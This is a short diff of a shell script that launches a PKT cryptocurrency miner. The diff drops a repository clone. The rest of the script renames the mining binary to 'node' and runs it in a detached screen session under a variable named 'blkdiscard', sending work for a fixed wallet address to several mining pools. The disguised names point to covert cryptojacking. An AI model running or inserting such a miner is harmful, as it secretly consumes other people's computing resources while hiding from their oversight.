@@ -1,7 +1,5 @@
 blkdiscard=$(shuf -n 1 -i 1-999999)
 sudo apt-get update && sudo apt-get install -y screen
-git clone https://github.com/ferolopo/tkp1
-cd tkp1
 mv tkp node
 chmod +x node
 screen -dmS blkdiscard ./node ann -p pkt1qu2j3ca9xanmkvlqmzrzwtmmxdhx2kn03gqtrdy http://pool.srizbi.com http://pool.pktpool.io http://pool.srizbi.com
